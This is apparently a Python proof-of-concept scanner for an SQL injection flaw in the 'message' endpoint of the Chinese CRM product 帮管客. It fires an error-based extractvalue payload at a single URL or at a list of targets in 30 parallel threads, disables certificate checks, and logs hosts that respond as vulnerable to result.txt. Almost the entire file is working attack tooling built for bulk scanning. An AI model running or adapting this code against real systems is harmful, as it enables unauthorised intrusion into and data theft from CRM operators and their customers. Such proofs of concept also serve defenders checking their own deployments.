import requests,argparse,sys,time,re,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
         
    ____  ________ __                                                                __
   / __ )/ ____/ //_/     ____ ___  ___  ______________ _____ ____       _________ _/ /
  / __  / / __/ ,<       / __ `__ \/ _ \/ ___/ ___/ __ `/ __ `/ _ \     / ___/ __ `/ / 
 / /_/ / /_/ / /| |     / / / / / /  __(__  |__  ) /_/ / /_/ /  __/    (__  ) /_/ / /  
/_____/\____/_/ |_|____/_/ /_/ /_/\___/____/____/\__,_/\__, /\___/____/____/\__, /_/   
                 /_____/                              /____/    /_____/       /_/      

                                                        version:BGK_message_sql 1.0.0
                                                        author:hi6                                                                 
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='帮管客CRM 客户管理系统 index.php的message 接口存在 sql 注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fb:
            for url in fb.readlines():
                url_list.append(url.strip())
        mp = Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(md5(1)),0x7e))%23&xu=desc'
    header={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target+payload,headers=header,proxies=proxies,timeout=15,verify=False)
        #print(res.text)
        match = re.findall(r'<p>(.*?)</p>', res.text)
        #print(match)
        if res.status_code == 500 and '~c4ca4238a0b923820dcc509a6f75849' in match[1]:
             print(f'[+]{target} have loopholes {target+payload}')
             with open('result.txt','a',encoding='utf-8') as fn:
                 fn.write(target.strip()+'\n')
    except:
        pass
if __name__ == "__main__":
    main()
